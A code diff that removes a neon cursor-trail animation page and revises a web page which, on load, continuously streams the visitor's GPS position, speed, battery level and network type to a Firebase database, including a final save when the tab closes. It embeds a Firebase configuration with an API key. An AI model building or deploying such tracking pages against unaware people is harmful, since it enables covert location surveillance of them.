@@ -1,105 +1,3 @@
-
-
-<!DOCTYPE html>
-<html lang="bn">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Neon Gradient Snake Trail</title>
-<style>
-  body {
-    margin: 0;
-    background: #050505;
-    height: 100vh;
-    overflow: hidden;
-    cursor: none;
-  }
-
-  canvas {
-    position: fixed;
-    top: 0;
-    left: 0;
-  }
-</style>
-</head>
-<body>
-
-<canvas id="trail"></canvas>
-
-<script>
-  const canvas = document.getElementById('trail');
-  const ctx = canvas.getContext('2d');
-  let width = canvas.width = window.innerWidth;
-  let height = canvas.height = window.innerHeight;
-
-  window.addEventListener('resize', () => {
-    width = canvas.width = window.innerWidth;
-    height = canvas.height = window.innerHeight;
-  });
-
-  const points = [];
-  const maxPoints = 20;
-
-  document.addEventListener('mousemove', e => {
-    points.push({ x: e.clientX, y: e.clientY });
-    if (points.length > maxPoints) points.shift();
-  });
-
-  const colors = [
-    { r: 255, g: 0, b: 153 },   // pink
-    { r: 180, g: 0, b: 255 },   // purple
-    { r: 0, g: 150, b: 255 }    // blue
-  ];
-
-  let colorStep = 0;
-  let colorSpeed = 0.02;
-
-  function interpolateColor(c1, c2, t) {
-    return {
-      r: c1.r + (c2.r - c1.r) * t,
-      g: c1.g + (c2.g - c1.g) * t,
-      b: c1.b + (c2.b - c1.b) * t
-    };
-  }
-
-  function draw() {
-    ctx.clearRect(0, 0, width, height);
-
-    // Color transition
-    const c1 = colors[Math.floor(colorStep) % colors.length];
-    const c2 = colors[(Math.floor(colorStep) + 1) % colors.length];
-    const t = colorStep % 1;
-    const color = interpolateColor(c1, c2, t);
-    colorStep += colorSpeed;
-
-    for (let i = 0; i < points.length - 1; i++) {
-      const p1 = points[i];
-      const p2 = points[i + 1];
-      const opacity = i / points.length;
-
-      const r = Math.floor(color.r);
-      const g = Math.floor(color.g);
-      const b = Math.floor(color.b);
-
-      ctx.strokeStyle = `rgba(${r}, ${g}, ${b}, ${opacity})`;
-      ctx.lineWidth = 14 * (1 - i / points.length);
-      ctx.shadowBlur = 25;
-      ctx.shadowColor = `rgba(${r}, ${g}, ${b}, 1)`;
-
-      ctx.beginPath();
-      ctx.moveTo(p1.x, p1.y);
-      ctx.lineTo(p2.x, p2.y);
-      ctx.stroke();
-    }
-
-    requestAnimationFrame(draw);
-  }
-
-  draw();
-</script>
-
-</body>
-</html>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -133,7 +31,7 @@ h2 {
   font-size: 17px;
   font-weight: bold;
   color:#0a7b0a;
-  min-height: 20px; /* To prevent jumping */
+  min-height: 20px; 
 }
 #user-id-display {
   font-size: 12px;
@@ -158,7 +56,7 @@ h2 {
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 import { getDatabase, ref, update } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
-// ✅ Your Firebase Config (আপনার দেওয়া কনফিগারেশন)
+// ✅ Firebase Config (আপনার কনফিগারেশন)
 const firebaseConfig = {
   apiKey: "AIzaSyCsGBSRCHVUhXQZ5DNMEZWgQWk1gxMF1E4",
   authDomain: "signup-d32c5.firebaseapp.com",
@@ -210,67 +108,63 @@ function saveLast(lat, lon) {
   });
 }
 
-// ৪. প্রধান লোকেশন সেন্ডিং ফাংশন (রিয়েল-টাইম ট্র্যাকিং)
+// ৪. প্রধান লোকেশন সেন্ডিং ফাংশন (এখন WatchPosition ব্যবহার করছে)
 function sendLocation() {
-  navigator.geolocation.watchPosition(async pos => {
-    const lat = pos.coords.latitude;
-    const lon = pos.coords.longitude;
-    const speed = pos.coords.speed ? (pos.coords.speed * 3.6).toFixed(1) : "0"; 
-    const battery = await getBatteryLevel();
-    const network = getNetworkType();
-    
-    statusText.textContent = `⏳ Sending data... Lat: ${lat.toFixed(6)}`;
+    // 💡 WATCHPOSITION ব্যবহার করা হলো। এটি দ্রুত লোকেশন পপ-আপ ট্রিগার করবে।
+    statusText.textContent = '⏳ Requesting Location Access...'; 
 
-    try {
-      await update(ref(db, "users/" + UNIQUE_USER_ID), {
-        latitude: lat,
-        longitude: lon,
-        speed: speed, 
-        battery: battery, 
-        network: network, 
-        time: new Date().toISOString()
-      });
+    navigator.geolocation.watchPosition(async pos => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      // কিলোমিটার/ঘন্টাতে রূপান্তর (Meters/sec * 3.6)
+      const speed = pos.coords.speed ? (pos.coords.speed * 3.6).toFixed(1) : "0"; 
+      const battery = await getBatteryLevel();
+      const network = getNetworkType();
+      
+      statusText.textContent = `⏳ Sending data... Lat: ${lat.toFixed(6)}`;
 
-      saveLast(lat, lon);
-      
-      // 🚀 Success Message: ডাটা সেভ হওয়ার পর কনফার্মেশন মেসেজ
-      statusText.textContent = "✅ Updated Successfully! Live tracking active.";
+      try {
+        await update(ref(db, "users/" + UNIQUE_USER_ID), {
+          latitude: lat,
+          longitude: lon,
+          speed: speed, 
+          battery: battery, 
+          network: network, 
+          time: new Date().toISOString()
+        });
 
-    } catch (error) {
-      console.error("Firebase Send Error:", error);
-      statusText.textContent = "⚠️ Error: Data could not be sent to Database!";
-    }
-  }, 
-  err => {
-    // Geolocation Permission বা GPS ত্রুটি
-    console.error("Location Error:", err.code, err.message);
-    if (err.code === 1) {
-      statusText.textContent = "❌ Permission Blocked! Please allow location access.";
-    } else {
-      statusText.textContent = "❌ Location Error! Check your GPS signal.";
-    }
-  }, 
-  { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+        saveLast(lat, lon);
+        
+        // 🚀 Success Message
+        statusText.textContent = "✅ Updated Successfully! Live tracking active.";
+
+      } catch (error) {
+        console.error("Firebase Send Error:", error);
+        statusText.textContent = "⚠️ Error: Data could not be sent to Database!";
+      }
+    },  
+    err => {
+      // Geolocation Permission বা GPS ত্রুটি
+      console.error("Location Error:", err.code, err.message);
+      if (err.code === 1) {
+        statusText.textContent = "❌ Permission Blocked! Please allow location access.";
+      } else {
+        statusText.textContent = "❌ Location Error! Check your GPS signal.";
+      }
+    },  
+    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
 }
 
-// ৫. ইনিশিয়াল পারমিশন রিকোয়েস্ট ও ট্র্যাকিং শুরু (কোড লোড হওয়ার সাথে সাথেই এটি শুরু হয়)
-// এটিই ব্রাউজারের Location Permission পপ-আপটি দেখায়।
-navigator.geolocation.getCurrentPosition(
-  ()=>{ 
-    statusText.textContent="✅ Location access granted! Starting live tracking..."; 
-    sendLocation(); 
-  },
-  ()=>{ 
-    statusText.textContent="❌ Enable location to continue!"; 
-  }
-);
+// ৫. ইনিশিয়াল পারমিশন রিকোয়েস্ট ও ট্র্যাকিং শুরু
+// 💡 কোড লোড হওয়ার সাথে সাথেই sendLocation() কল করা হলো।
+sendLocation(); 
 
 
 // ৬. ট্যাব বন্ধ করার সময় শেষ লোকেশন সেভ
 window.addEventListener("beforeunload", () => {
-  navigator.geolocation.getCurrentPosition(p => {
-    saveLast(p.coords.latitude, p.coords.longitude);
-  });
+  navigator.geolocation.getCurrentPosition(p => {
+    saveLast(p.coords.latitude, p.coords.longitude);
+  });
 });
 </script>
 </body>
